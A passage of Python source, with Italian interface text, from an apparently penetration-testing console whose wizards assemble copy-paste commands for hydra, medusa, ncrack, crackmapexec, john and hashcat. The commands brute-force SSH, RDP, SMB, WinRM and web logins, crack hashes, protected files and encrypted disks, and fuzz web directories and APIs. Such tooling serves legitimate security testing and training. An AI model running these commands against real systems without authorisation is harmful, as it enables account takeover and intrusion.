        commands.append(("ffuf", f"ffuf -u {url} -X POST -d \"user={user}&pass=FUZZ\" -w {_wl_path(main_wl)} -fc 401,403 -c"))
        commands.append(("wfuzz", f"wfuzz -u {url} -d \"user={user}&pass=FUZZ\" -w {_wl_path(main_wl)} --hc 401,403 -t 50"))
        commands.append(("medusa", f"medusa -h {target['host']} {user_flag_med} -P {_wl_path(main_wl)} -M http -m DIR:{target['path']}"))
    elif context == "service":
        commands.append(("hydra SSH", f"hydra {user_flag} -P {_wl_path(main_wl)} {target['host']} ssh -t 4"))
        commands.append(("hydra FTP", f"hydra {user_flag} -P {_wl_path(main_wl)} {target['host']} ftp -t 4"))
        commands.append(("hydra RDP", f"hydra {user_flag} -P {_wl_path(main_wl)} {target['host']} rdp -t 4"))
        commands.append(("medusa SSH", f"medusa -h {target['host']} {user_flag_med} -P {_wl_path(main_wl)} -M ssh -t 4"))
        commands.append(("ncrack SSH", f"ncrack {'-U ' + _wl_path(user_wl_key) if user_wl_key else '-u ' + user} -P {_wl_path(main_wl)} {target['host']}:22"))
        commands.append(("crackmapexec SMB", f"crackmapexec smb {target['host']} {user_flag_cme} -p {_wl_path(main_wl)}"))
    else:
        commands.append(("john", f"john --wordlist={_wl_path(main_wl)} hash.txt"))
        commands.append(("hashcat", f"hashcat -m 0 hash.txt {_wl_path(main_wl)}"))
        if lang in lang_wl:
            commands.append(("john lang", f"john --wordlist={_wl_path(lang_wl[lang])} hash.txt"))
            commands.append(("hashcat lang", f"hashcat -m 0 hash.txt {_wl_path(lang_wl[lang])}"))

    result = {"wordlists": wordlists, "commands": commands}
    if user_wls:
        result["user_wordlists"] = user_wls
    return result


def _build_api_result(target: dict, api_type: str, intensity: str) -> dict:
    url = target["base_path"]
    wordlists = []

    if api_type == "graphql":
        wordlists = ["api_graphql", "api_common"]
    else:
        wordlists = ["api_endpoints", "api_objects", "api_common"]

    main_wl = wordlists[0]
    commands = []
    commands.append(("ffuf", f"ffuf -u {url}/FUZZ -w {_wl_path(main_wl)} -t 50 -c -mc all -fc 404"))
    commands.append(("gobuster", f"gobuster dir -u {url} -w {_wl_path(main_wl)} -t 50"))
    commands.append(("wfuzz", f"wfuzz -u {url}/FUZZ -w {_wl_path(main_wl)} --hc 404 -t 50"))
    commands.append(("feroxbuster", f"feroxbuster -u {url} -w {_wl_path(main_wl)} -t 50 --no-recursion"))

    if api_type == "graphql":
        commands.append(("graphql introspection", f'curl -s -X POST {url} -H "Content-Type: application/json" -d \'{{"query":"{{__schema{{types{{name}}}}}}"}}\' | python3 -m json.tool'))
    elif api_type == "swagger":
        swagger_paths = ["/swagger.json", "/openapi.json", "/api-docs", "/swagger/v1/swagger.json", "/v2/api-docs"]
        for sp in swagger_paths:
            commands.append(("curl swagger", f"curl -s {target['base']}{sp}"))

    return {"wordlists": wordlists, "commands": commands}


def _print_wordfind_result(result: dict) -> None:
    print(f"\n  \033[92m┌─ Risultato ────────────────────────────────┐\033[0m\n")

    if result.get("wordlists"):
        print("  \033[1mWordlist consigliate:\033[0m")
        for i, key in enumerate(result["wordlists"], 1):
            print(f"    [{i}] {_wl_label(key)}")
            link = _wl_link(key)
            if link:
                print(f"        \033[90m↳ {link}\033[0m")
        print()

    if result.get("extensions"):
        print(f"  \033[1mEstensioni:\033[0m {result['extensions']}")
        print()

    if result.get("commands"):
        print("  \033[1mComandi pronti (copia-incolla):\033[0m\n")
        for tool_name, cmd in result["commands"]:
            print(f"    \033[96m# {tool_name}\033[0m")
            if len(cmd) > 90:
                parts = cmd.split(" -", 1)
                if len(parts) == 2:
                    print(f"    {parts[0]} \\")
                    flags = (" -" + parts[1]).split(" -")
                    for j, flag in enumerate(flags):
                        flag = flag.strip()
                        if flag:
                            suffix = " \\" if j < len(flags) - 1 else ""
                            print(f"      -{flag}{suffix}")
                else:
                    print(f"    {cmd}")
            else:
                print(f"    {cmd}")
            print()

    print(f"  \033[92m└────────────────────────────────────────────┘\033[0m")


def cmd_wordfind(args: argparse.Namespace, state: ConsoleState | None = None) -> int:
    url = getattr(args, "url", None) or ""
    if not url:
        try:
            url = input("\n  Target URL: ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return 0
    if not url:
        print("Specifica un URL target.", file=sys.stderr)
        return 1

    if not url.startswith("http://") and not url.startswith("https://"):
        url = "http://" + url

    target = _parse_target(url)

    print(f"\n  \033[92m┌─ wordfind ─────────────────────────────────┐\033[0m")
    print(f"\n  Target: \033[94m{url}\033[0m")

    # Step 1: Scope
    choice = _wf_ask("[1] Cosa stai cercando?", _SCOPE_MENU)
    if choice == -1:
        return 0
    scope_key = _SCOPE_MENU[choice - 1][0]

    if scope_key == "dir":
        # Step 2: Technology
        tech_choice = _wf_ask("[2] Tecnologia?", _TECH_MENU, default=8)
        if tech_choice == -1:
            return 0
        tech_key = _TECH_MENU[tech_choice - 1][0]
        tech_exts = _TECH_MENU[tech_choice - 1][2]

        # Step 3: Intensity
        int_choice = _wf_ask("[3] Intensità?", _INTENSITY_DIR, default=2)
        if int_choice == -1:
            return 0
        intensity = _INTENSITY_DIR[int_choice - 1][0]

        result = _build_dir_result(target, tech_key, tech_exts, intensity)

    elif scope_key == "sub":
        int_choice = _wf_ask("[2] Intensità?", _INTENSITY_SUB, default=2)
        if int_choice == -1:
            return 0
        intensity = _INTENSITY_SUB[int_choice - 1][0]

        result = _build_sub_result(target, intensity)

    elif scope_key == "vhost":
        int_choice = _wf_ask("[2] Intensità?", _INTENSITY_GENERIC, default=2)
        if int_choice == -1:
            return 0
        intensity = _INTENSITY_GENERIC[int_choice - 1][0]

        result = _build_vhost_result(target, intensity)

    elif scope_key == "param":
        int_choice = _wf_ask("[2] Intensità?", _INTENSITY_GENERIC, default=2)
        if int_choice == -1:
            return 0
        intensity = _INTENSITY_GENERIC[int_choice - 1][0]

        result = _build_param_result(target, intensity)

    elif scope_key == "user":
        int_choice = _wf_ask("[2] Intensità?", _INTENSITY_GENERIC, default=2)
        if int_choice == -1:
            return 0
        intensity = _INTENSITY_GENERIC[int_choice - 1][0]

        result = _build_user_result(target, intensity)

    elif scope_key == "pass":
        # Step 2: Context
        ctx_choice = _wf_ask("[2] Contesto?", _PASS_CONTEXT_MENU)
        if ctx_choice == -1:
            return 0
        context = _PASS_CONTEXT_MENU[ctx_choice - 1][0]

        # If service context, ask protocol + parse IP:PORT
        svc_proto = None
        svc_port = None
        if context == "service":
            svc_menu = [(s[0], f"{s[1]}  (porta {s[2]})") for s in _PF_SERVICE_MENU]
            svc_choice = _wf_ask("[2b] Protocollo?", svc_menu)
            if svc_choice == -1:
                return 0
            svc_entry = _PF_SERVICE_MENU[svc_choice - 1]
            svc_proto = svc_entry[0]
            svc_default_port = svc_entry[2]

            # Parse IP:PORT from target
            host_raw = target["host"]
            if ":" in host_raw and not host_raw.startswith("["):
                parts = host_raw.rsplit(":", 1)
                if parts[1].isdigit():
                    target["host"] = parts[0]
                    svc_port = parts[1]

            if not svc_port:
                print()
                port_input = _wf_ask_text(f"[2c] Porta? (invio = {svc_default_port})", default="")
                svc_port = port_input if port_input else svc_default_port

        # Step 3: Language
        lang_choice = _wf_ask("[3] Lingua / localizzazione?", _LANG_MENU)
        if lang_choice == -1:
            return 0
        lang = _LANG_MENU[lang_choice - 1][0]

        # Step 4: Username
        _USER_MODE_WF = [
            ("single", "Username singolo (lo scrivo io)"),
            ("wordlist", "Wordlist username (non conosco lo username)"),
        ]
        user_mode = _wf_ask("[4] Username?", _USER_MODE_WF)
        if user_mode == -1:
            return 0

        username = "admin"
        user_wl_key = None
        if user_mode == 1:
            print()
            username = _wf_ask_text("[4b] Username (vuoto = admin)", default="admin")
        else:
            _USER_WL_WF = [
                ("user_top", "top-usernames-shortlist.txt  (17 — i più comuni)"),
                ("user_cirt", "cirt-default-usernames.txt  (827 — credenziali default)"),
                ("user_names", "names.txt  (10k — nomi comuni)"),
                ("user_unix", "unix_users.txt  (167 — utenti UNIX tipici)"),
                ("user_xato", "xato-net-10-million-usernames.txt  (8.3M — esaustiva)"),
            ]
            uwl = _wf_ask("[4b] Quale wordlist username?", _USER_WL_WF)
            if uwl == -1:
                return 0
            user_wl_key = _USER_WL_WF[uwl - 1][0]

        # Step 5: Intensity
        int_choice = _wf_ask("[5] Intensità?", _INTENSITY_GENERIC, default=2)
        if int_choice == -1:
            return 0
        intensity = _INTENSITY_GENERIC[int_choice - 1][0]

        if context == "service" and svc_proto:
            result = _build_service_result(svc_proto, svc_port, target["host"],
                                           username, intensity, user_wl_key=user_wl_key)
            # Add password wordlists to result
            pw_wls = []
            if intensity == "fast":
                pw_wls = ["pass_500", "pass_default_web"]
            elif intensity == "medium":
                pw_wls = ["pass_top10k", "pass_common"]
            else:
                pw_wls = ["pass_top1m", "pass_rockyou"]
            lang_wl = {"it": "pass_it", "es": "pass_es", "de": "pass_de", "fr": "pass_fr"}
            if lang in lang_wl:
                pw_wls.append(lang_wl[lang])
            result["wordlists"] = pw_wls
        else:
            result = _build_pass_result(target, context, lang, username, intensity,
                                        user_wl_key=user_wl_key)

    elif scope_key == "api":
        # Step 2: API type
        api_choice = _wf_ask("[2] Tipo di API?", _API_TYPE_MENU)
        if api_choice == -1:
            return 0
        api_type = _API_TYPE_MENU[api_choice - 1][0]

        # Step 3: Intensity
        int_choice = _wf_ask("[3] Intensità?", _INTENSITY_GENERIC, default=2)
        if int_choice == -1:
            return 0
        intensity = _INTENSITY_GENERIC[int_choice - 1][0]

        result = _build_api_result(target, api_type, intensity)

    else:
        print("Scopo non supportato.")
        return 1

    _print_wordfind_result(result)
    return 0


# ──────────────────────────────────────────────────────────────
# passfind — Wizard per password cracking
# ──────────────────────────────────────────────────────────────

_PF_SCOPE_MENU = [
    ("hash", "Hash (MD5, SHA, NTLM, bcrypt, ...)"),
    ("file", "File protetto (SSH key, PDF, Office, ZIP, RAR, ...)"),
    ("archive", "Archivio / disco cifrato (BitLocker, TrueCrypt, LUKS, ...)"),
    ("service", "Servizio di rete (SSH, RDP, FTP, SMB, ...)"),
]

_PF_HASH_INPUT_MENU = [
    ("identify", "Ho l'hash — identificalo tu"),
    ("known", "Conosco già il formato"),
    ("auto", "Non conosco il formato — prova in auto"),
]

_PF_HASH_FORMAT_MENU = [
    ("raw-md5",       "MD5",                "0",     "raw-md5"),
    ("raw-sha1",      "SHA1",               "100",   "raw-sha1"),
    ("raw-sha256",    "SHA256",             "1400",  "raw-sha256"),
    ("raw-sha512",    "SHA512",             "1700",  "raw-sha512"),
    ("nt",            "NTLM",              "1000",  "nt"),
    ("bcrypt",        "bcrypt",            "3200",  "bcrypt"),
    ("md5crypt",      "md5crypt ($1$)",    "500",   "md5crypt"),
    ("sha512crypt",   "sha512crypt ($6$)", "1800",  "sha512crypt"),
    ("sha256crypt",   "sha256crypt ($5$)", "7400",  "sha256crypt"),
    ("netlmv2",       "NETNTLMv2",         "5600",  "netntlmv2"),
    ("netntlmv2",     "NETNTLMv2",         "5600",  "netntlmv2"),
    ("krb5tgs",       "Kerberoast (TGS)",  "13100", "krb5tgs"),
    ("krb5asrep",     "AS-REP Roast",      "18200", "krb5asrep"),
    ("mscash2",       "DCC2 / mscash2",    "2100",  "mscash2"),
    ("descrypt",      "DES crypt",         "1500",  "descrypt"),
    ("lm",            "LM",                "3000",  "LM"),
    ("phpass",        "phpass (WordPress)", "400",   "phpass-md5"),
    ("ipmi",          "IPMI 2.0 RAKP",     "7300",  ""),
    ("mysql",         "MySQL 4.1+",        "300",   "mysql-sha1"),
    ("mssql",         "MSSQL",             "131",   "mssql05"),
    ("oracle11",      "Oracle 11g+",       "112",   "oracle11"),
]

_PF_ATTACK_MENU = [
    ("wordlist_rules", "Wordlist + regole", "dizionario + mutazioni (consigliato)"),
    ("wordlist",       "Wordlist semplice", "solo dizionario, nessuna regola"),
    ("mask",           "Mask attack",       "conosco pattern o lunghezza"),
    ("incremental",    "Brute-force puro",  "tutte le combinazioni (lento)"),
]

_PF_INTENSITY_MENU = [
    ("fast",   "Veloce",   "top 10k password",            "⚡"),
    ("medium", "Media",    "rockyou.txt (~14M)",           "⚖️"),
    ("full",   "Completa", "rockyou + regole best64.rule", "🔍"),
]

_PF_FILE_MENU = [
    ("ssh",     "SSH private key",         "ssh2john",              "22921"),
    ("pdf",     "PDF",                     "pdf2john",              "10700"),
    ("office",  "Microsoft Office",        "office2john",           "9600"),
    ("zip",     "ZIP",                     "zip2john",              "17200"),
    ("rar",     "RAR",                     "rar2john",              "13000"),
    ("7z",      "7-Zip",                   "7z2john",               "11600"),
    ("keepass", "KeePass (.kdbx)",         "keepass2john",          "13400"),
    ("putty",   "PuTTY key (.ppk)",        "putty2john",           "15300"),
    ("gpg",     "GPG / PGP key",           "gpg2john",             "17010"),
    ("bitcoin", "Bitcoin wallet",          "bitcoin2john",         "11300"),
]

_PF_ARCHIVE_MENU = [
    ("bitlocker",  "BitLocker (.vhd)",     "bitlocker2john",  "22100"),
    ("truecrypt",  "TrueCrypt / VeraCrypt","truecrypt_volume2john", "6211"),
    ("luks",       "LUKS",                 "",                "14600"),
    ("openssl",    "OpenSSL enc (gzip/aes)", "",              ""),
]

_PF_SERVICE_MENU = [
    ("ssh",      "SSH",                    "22"),
    ("rdp",      "RDP",                    "3389"),
    ("ftp",      "FTP",                    "21"),
    ("smb",      "SMB",                    "445"),
    ("http",     "HTTP form login",        "80"),
    ("mysql",    "MySQL",                  "3306"),
    ("mssql",    "MSSQL",                  "1433"),
    ("postgres", "PostgreSQL",             "5432"),
    ("winrm",    "WinRM",                  "5985"),
    ("vnc",      "VNC",                    "5900"),
]

_PF_MASK_MENU = [
    ("lower8",  "8 caratteri minuscoli",          "?l?l?l?l?l?l?l?l"),
    ("mixed8",  "8 caratteri misti (a-z, A-Z, 0-9)", "?a?a?a?a?a?a?a?a"),
    ("cap_num", "Maiuscola + 5 minusc + 2 cifre", "?u?l?l?l?l?l?d?d"),
    ("custom",  "Scrivo io la maschera",          ""),
]


def _pf_hash_detect_hint(hash_str: str) -> list[str]:
    """Return hints about likely hash format from the hash string itself."""
    h = hash_str.strip()
    hints = []
    if h.startswith("$1$"):
        hints.append("md5crypt ($1$) — john: --format=md5crypt | hashcat: -m 500")
    elif h.startswith("$5$"):
        hints.append("sha256crypt ($5$) — john: --format=sha256crypt | hashcat: -m 7400")
    elif h.startswith("$6$"):
        hints.append("sha512crypt ($6$) — john: --format=sha512crypt | hashcat: -m 1800")
    elif h.startswith("$2a$") or h.startswith("$2b$") or h.startswith("$2y$"):
        hints.append("bcrypt — john: --format=bcrypt | hashcat: -m 3200")
    elif h.startswith("$krb5tgs$"):
        hints.append("Kerberoast TGS — john: --format=krb5tgs | hashcat: -m 13100")
    elif h.startswith("$krb5asrep$"):
        hints.append("AS-REP Roast — john: --format=krb5asrep | hashcat: -m 18200")
    elif len(h) == 32 and all(c in "0123456789abcdefABCDEF" for c in h):
        hints.append("Possibile MD5 o NTLM (32 hex)")
        hints.append("  MD5  — john: --format=raw-md5 | hashcat: -m 0")
        hints.append("  NTLM — john: --format=nt      | hashcat: -m 1000")
    elif len(h) == 40 and all(c in "0123456789abcdefABCDEF" for c in h):
        hints.append("Possibile SHA1 (40 hex)")
        hints.append("  john: --format=raw-sha1 | hashcat: -m 100")
    elif len(h) == 64 and all(c in "0123456789abcdefABCDEF" for c in h):
        hints.append("Possibile SHA256 (64 hex)")
        hints.append("  john: --format=raw-sha256 | hashcat: -m 1400")
    elif len(h) == 128 and all(c in "0123456789abcdefABCDEF" for c in h):
        hints.append("Possibile SHA512 (128 hex)")
        hints.append("  john: --format=raw-sha512 | hashcat: -m 1700")
    elif "::" in h and "$" not in h:
        hints.append("Possibile NETNTLMv2")
        hints.append("  john: --format=netntlmv2 | hashcat: -m 5600")
    if not hints:
        hints.append("Formato non riconosciuto — usa hashid o hashcat --identify")
    return hints


def _build_hash_result(john_fmt: str, hc_mode: str, attack: str,
                       intensity: str, mask: str) -> dict:
    wl_fast = "/usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt"
    wl_med = "/usr/share/wordlists/rockyou.txt"
    rules = "/usr/share/hashcat/rules/best64.rule"

    wordlists = []
    commands = []

    if attack == "mask":
        if john_fmt:
            commands.append(("hashcat (mask)", f"hashcat -a 3 -m {hc_mode} hash.txt '{mask}'"))
            commands.append(("john (mask)", f"john --format={john_fmt} --mask='{mask}' hash.txt"))
        else:
            commands.append(("john (mask, auto)", f"john --mask='{mask}' hash.txt"))
        return {"wordlists": wordlists, "commands": commands}

    if attack == "incremental":
        if john_fmt:
            commands.append(("john (incremental)", f"john --format={john_fmt} --incremental hash.txt"))
        else:
            commands.append(("john (incremental, auto)", "john --incremental hash.txt"))
        if hc_mode:
            commands.append(("hashcat (brute-force)", f"hashcat -a 3 -m {hc_mode} hash.txt ?a?a?a?a?a?a?a?a"))
        return {"wordlists": wordlists, "commands": commands}

    if intensity == "fast":
        wl = wl_fast
        wl_label = "xato-net-10-million-passwords-10000.txt"
        wordlists.append("pass_top10k")
    elif intensity == "medium":
        wl = wl_med
        wl_label = "rockyou.txt"
        wordlists.append("pass_rockyou")
    else:
        wl = wl_med
        wl_label = "rockyou.txt + best64.rule"
        wordlists.append("pass_rockyou")

    if john_fmt:
        if attack == "wordlist_rules":
            commands.append(("john (wordlist + rules)", f"john --format={john_fmt} --wordlist={wl} --rules hash.txt"))
        commands.append(("john (wordlist)", f"john --format={john_fmt} --wordlist={wl} hash.txt"))
        commands.append(("john (show)", f"john --format={john_fmt} hash.txt --show"))

    if hc_mode:
        if attack == "wordlist_rules" or intensity == "full":
            commands.append(("hashcat (wordlist + rules)", f"hashcat -a 0 -m {hc_mode} hash.txt {wl} -r {rules}"))
        commands.append(("hashcat (wordlist)", f"hashcat -a 0 -m {hc_mode} hash.txt {wl}"))

    if not john_fmt and not hc_mode:
        commands.append(("john (auto)", f"john --wordlist={wl} hash.txt"))
        if attack == "wordlist_rules":
            commands.append(("john (auto + rules)", f"john --wordlist={wl} --rules hash.txt"))
        commands.append(("john (show)", "john hash.txt --show"))

    return {"wordlists": wordlists, "commands": commands}


def _build_file_result(file_type: str, tool_2john: str, hc_mode: str,
                       intensity: str) -> dict:
    wl = "/usr/share/wordlists/rockyou.txt"
    if intensity == "fast":
        wl = "/usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt"

    rules = "/usr/share/hashcat/rules/best64.rule"
    ext_map = {
        "ssh": "id_rsa", "pdf": "document.pdf", "office": "file.docx",
        "zip": "archive.zip", "rar": "archive.rar", "7z": "archive.7z",
        "keepass": "database.kdbx", "putty": "key.ppk",
        "gpg": "key.gpg", "bitcoin": "wallet.dat",
    }
    sample = ext_map.get(file_type, "file")

    commands = []
    notes = []

    if tool_2john:
        commands.append(("1. Estrai hash", f"{tool_2john} {sample} > hash.txt"))
    else:
        notes.append(f"Nessun tool *2john specifico — prova: locate *2john*")

    commands.append(("2. john (crack)", f"john --wordlist={wl} hash.txt"))
    if intensity == "full":
        commands.append(("2b. john (+ rules)", f"john --wordlist={wl} --rules hash.txt"))
    commands.append(("3. john (show)", "john hash.txt --show"))

    if hc_mode:
        if intensity == "full":
            commands.append(("hashcat (+ rules)", f"hashcat -a 0 -m {hc_mode} hash.txt {wl} -r {rules}"))
        else:
            commands.append(("hashcat", f"hashcat -a 0 -m {hc_mode} hash.txt {wl}"))

    result = {"commands": commands}
    if notes:
        result["notes"] = notes
    return result


def _build_archive_result(archive_type: str, tool_2john: str, hc_mode: str,
                          intensity: str) -> dict:
    wl = "/usr/share/wordlists/rockyou.txt"
    if intensity == "fast":
        wl = "/usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt"
    rules = "/usr/share/hashcat/rules/best64.rule"

    commands = []

    if archive_type == "openssl":
        commands.append(("Brute-force OpenSSL", "for i in $(cat " + wl + ");do openssl enc -aes-256-cbc "
                         "-d -in encrypted.gz -k $i 2>/dev/null | tar xz && echo \"Password: $i\" && break; done"))
        return {"commands": commands}

    if tool_2john:
        sample = {"bitlocker": "disk.vhd", "truecrypt": "volume", "luks": "disk.img"}.get(archive_type, "file")
        commands.append(("1. Estrai hash", f"{tool_2john} -i {sample} > hash.txt"))
        if archive_type == "bitlocker":
            commands.append(("1b. Filtra hash", 'grep "bitlocker\\$0" hash.txt > crack.hash'))

    hash_file = "crack.hash" if archive_type == "bitlocker" else "hash.txt"
    commands.append(("2. john (crack)", f"john --wordlist={wl} {hash_file}"))
    commands.append(("3. john (show)", f"john {hash_file} --show"))

    if hc_mode:
        if intensity == "full":
            commands.append(("hashcat (+ rules)", f"hashcat -a 0 -m {hc_mode} {hash_file} {wl} -r {rules}"))
        else:
            commands.append(("hashcat", f"hashcat -a 0 -m {hc_mode} {hash_file} {wl}"))

    if archive_type == "bitlocker":
        commands.append(("Monta (Linux)", "sudo dislocker /dev/loop0p2 -uPASSWORD -- /media/bitlocker && "
                         "sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount"))

    return {"commands": commands}


def _build_service_result(proto: str, port: str, host: str, username: str,
                          intensity: str, user_wl_key: str | None = None) -> dict:
    wl = "/usr/share/wordlists/rockyou.txt"
    if intensity == "fast":
        wl = "/usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt"

    user_flag = f"-L {_wl_path(user_wl_key)}" if user_wl_key else f"-l {username}"
    user_flag_med = f"-U {_wl_path(user_wl_key)}" if user_wl_key else f"-u {username}"
    user_flag_cme = f"-u {_wl_path(user_wl_key)}" if user_wl_key else f"-u {username}"
    user_flag_ncr = f"-U {_wl_path(user_wl_key)}" if user_wl_key else f"-u {username}"

    host_port = f"{host}:{port}" if port else host
    host_s = f"-s {port} " if port and port not in ("22","21","445","80","3306","1433","5432","5985","5900","3389") else ""

    commands = []
    result_wl = []
    user_wls = []

    if user_wl_key:
        user_wls.append(user_wl_key)

    if proto == "http":
        commands.append(("hydra (http-post-form)",
            f"hydra {user_flag} -P {wl} {host_s}{host} http-post-form "
            f"\"/login:user=^USER^&pass=^PASS^:F=incorrect\" -t 16"))
        commands.append(("medusa (http)",
            f"medusa -h {host} {user_flag_med} -P {wl} -M http -m DIR:/login -t 4"
            + (f" -n {port}" if port and port != "80" else "")))
    elif proto == "winrm":
        commands.append(("crackmapexec",
            f"crackmapexec winrm {host_port} {user_flag_cme} -p {wl}"))
        commands.append(("evil-winrm (dopo crack)",
            f"evil-winrm -i {host} -u {username or 'USER'} -p 'PASSWORD'"))
    elif proto == "smb":
        commands.append(("hydra",
            f"hydra {user_flag} -P {wl} {host_s}{host} smb -t 4"))
        commands.append(("crackmapexec",
            f"crackmapexec smb {host_port} {user_flag_cme} -p {wl}"))
        commands.append(("medusa",
            f"medusa -h {host} {user_flag_med} -P {wl} -M smbnt -t 4"
            + (f" -n {port}" if port and port != "445" else "")))
        commands.append(("ncrack",
            f"ncrack {user_flag_ncr} -P {wl} smb://{host_port}"))
    else:
        svc = proto
        commands.append(("hydra",
            f"hydra {user_flag} -P {wl} {host_s}{host} {svc} -t 4"))
        commands.append(("medusa",
            f"medusa -h {host} {user_flag_med} -P {wl} -M {svc} -t 4"
            + (f" -n {port}" if port else "")))
        commands.append(("ncrack",
            f"ncrack {user_flag_ncr} -P {wl} {svc}://{host_port}"))

    result = {"commands": commands}
    if user_wls:
        result["user_wordlists"] = user_wls
    return result


def _print_passfind_result(result: dict) -> None:
    print(f"\n  \033[92m┌─ Risultato ────────────────────────────────┐\033[0m\n")

    if result.get("hints"):
        print("  \033[1mRilevamento hash:\033[0m")
        for h in result["hints"]:
            print(f"    {h}")
        print()

    if result.get("notes"):
        for n in result["notes"]:
            print(f"  \033[93m[!]\033[0m {n}")
        print()

    if result.get("wordlists"):
        print("  \033[1mWordlist consigliate:\033[0m")
        for i, key in enumerate(result["wordlists"], 1):
            print(f"    [{i}] {_wl_label(key)}")
            link = _wl_link(key)
            if link:
                print(f"        \033[90m↳ {link}\033[0m")
        print()

    if result.get("user_wordlists"):
        print("  \033[1mWordlist username consigliate:\033[0m")
        for i, key in enumerate(result["user_wordlists"], 1):
            print(f"    [{i}] {_wl_label(key)}")
            link = _wl_link(key)
            if link:
                print(f"        \033[90m↳ {link}\033[0m")
        print()

    if result.get("commands"):
        print("  \033[1mComandi pronti (copia-incolla):\033[0m\n")
        for tool_name, cmd in result["commands"]:
            print(f"    \033[96m# {tool_name}\033[0m")
            if len(cmd) > 90:
                parts = cmd.split(" -", 1)
                if len(parts) == 2:
                    print(f"    {parts[0]} \\")
                    flags = (" -" + parts[1]).split(" -")
                    for j, flag in enumerate(flags):
                        flag = flag.strip()
                        if flag:
                            suffix = " \\" if j < len(flags) - 1 else ""
                            print(f"      -{flag}{suffix}")
                else:
                    print(f"    {cmd}")
            else:
                print(f"    {cmd}")
            print()

    if result.get("extra_info"):
        print(f"  \033[1mInfo utili:\033[0m")
        for line in result["extra_info"]:
            print(f"    {line}")
        print()

    print(f"  \033[92m└────────────────────────────────────────────┘\033[0m")


def cmd_passfind(args: argparse.Namespace, state: ConsoleState | None = None) -> int:
    print(f"\n  \033[92m┌─ passfind ─────────────────────────────────┐\033[0m")
    print(f"  \033[90m  Wizard password cracking\033[0m\n")

    # Step 1: scope
    choice = _wf_ask("[1] Cosa devi crackare?", _PF_SCOPE_MENU)
    if choice == -1:
        return 0
    scope = _PF_SCOPE_MENU[choice - 1][0]

    # ── Hash ──────────────────────────────────────────────────
    if scope == "hash":
        inp_choice = _wf_ask("[2] Hai l'hash o conosci il formato?", _PF_HASH_INPUT_MENU)
        if inp_choice == -1:
            return 0

        john_fmt = ""
        hc_mode = ""

        if inp_choice == 1:
            print()
            hash_str = _wf_ask_text("[hash] Incolla l'hash")
            if not hash_str:
                print("  Nessun hash inserito.")
                return 1
            hints = _pf_hash_detect_hint(hash_str)

            fmt_menu = [(f[0], f[1]) for f in _PF_HASH_FORMAT_MENU[:16]]
            fmt_choice = _wf_ask("[3] Seleziona il formato (o basati sui suggerimenti sopra)", fmt_menu)
            if fmt_choice == -1:
                return 0
            entry = _PF_HASH_FORMAT_MENU[fmt_choice - 1]
            john_fmt = entry[3]
            hc_mode = entry[2]
        elif inp_choice == 2:
            fmt_menu = [(f[0], f[1]) for f in _PF_HASH_FORMAT_MENU]
            fmt_choice = _wf_ask("[3] Formato hash?", fmt_menu)
            if fmt_choice == -1:
                return 0
            entry = _PF_HASH_FORMAT_MENU[fmt_choice - 1]
            john_fmt = entry[3]
            hc_mode = entry[2]
            hints = []
        else:
            hints = ["Auto-detect: john tenterà di identificare il formato automaticamente"]

        atk_choice = _wf_ask("[4] Metodo di attacco?", _PF_ATTACK_MENU)
        if atk_choice == -1:
            return 0
        attack = _PF_ATTACK_MENU[atk_choice - 1][0]

        mask = ""
        if attack == "mask":
            mask_choice = _wf_ask("[4b] Pattern maschera?", _PF_MASK_MENU)
            if mask_choice == -1:
                return 0
            mask = _PF_MASK_MENU[mask_choice - 1][2]
            if not mask:
                print()
                mask = _wf_ask_text("[mask] Inserisci la maschera (es. ?u?l?l?l?d?d)", default="?a?a?a?a?a?a?a?a")

        int_choice = _wf_ask("[5] Intensità wordlist?", _PF_INTENSITY_MENU, default=2)
        if int_choice == -1:
            return 0
        intensity = _PF_INTENSITY_MENU[int_choice - 1][0]

        result = _build_hash_result(john_fmt, hc_mode, attack, intensity, mask)
        if hints:
            result["hints"] = hints

        extra = []
        extra.append("Identifica hash:   hashid -m -j '<hash>'")
        extra.append("Formati john:      john --list=formats | grep -i <tipo>")
        extra.append("Formati hashcat:   hashcat --help | grep -i <tipo>")
        result["extra_info"] = extra

    # ── File protetto ─────────────────────────────────────────
    elif scope == "file":
        file_menu = [(f[0], f[1]) for f in _PF_FILE_MENU]
        file_choice = _wf_ask("[2] Tipo di file?", file_menu)
        if file_choice == -1:
            return 0
        entry = _PF_FILE_MENU[file_choice - 1]
        file_type = entry[0]
        tool_2john = entry[2]
        hc_mode = entry[3]

        int_choice = _wf_ask("[3] Intensità?", _PF_INTENSITY_MENU, default=2)
        if int_choice == -1:
            return 0
        intensity = _PF_INTENSITY_MENU[int_choice - 1][0]

        result = _build_file_result(file_type, tool_2john, hc_mode, intensity)
        result["extra_info"] = [
            f"Tool estrazione:   {tool_2john}",
            "Cerca tutti i *2john:  locate *2john*",
        ]

    # ── Archivio / disco cifrato ──────────────────────────────
    elif scope == "archive":
        arc_menu = [(a[0], a[1]) for a in _PF_ARCHIVE_MENU]
        arc_choice = _wf_ask("[2] Tipo di archivio?", arc_menu)
        if arc_choice == -1:
            return 0
        entry = _PF_ARCHIVE_MENU[arc_choice - 1]
        archive_type = entry[0]
        tool_2john = entry[2]
        hc_mode = entry[3]

        int_choice = _wf_ask("[3] Intensità?", _PF_INTENSITY_MENU, default=2)
        if int_choice == -1:
            return 0
        intensity = _PF_INTENSITY_MENU[int_choice - 1][0]

        result = _build_archive_result(archive_type, tool_2john, hc_mode, intensity)

        if archive_type == "bitlocker":
            result["extra_info"] = [
                "Su Windows: doppio click sul .vhd → inserisci password",
                "Su Linux: installa dislocker (sudo apt install dislocker)",
            ]

    # ── Servizio di rete ──────────────────────────────────────
    elif scope == "service":
        svc_menu = [(s[0], f"{s[1]}  (porta {s[2]})") for s in _PF_SERVICE_MENU]
        svc_choice = _wf_ask("[2] Protocollo?", svc_menu)
        if svc_choice == -1:
            return 0
        entry = _PF_SERVICE_MENU[svc_choice - 1]
        proto = entry[0]
        default_port = entry[2]

        print()
        host_raw = _wf_ask_text("[3] Target IP/hostname (oppure IP:PORTA)", default="10.10.11.42")
        if ":" in host_raw and not host_raw.startswith("["):
            parts = host_raw.rsplit(":", 1)
            if parts[1].isdigit():
                host = parts[0]
                port = parts[1]
            else:
                host = host_raw
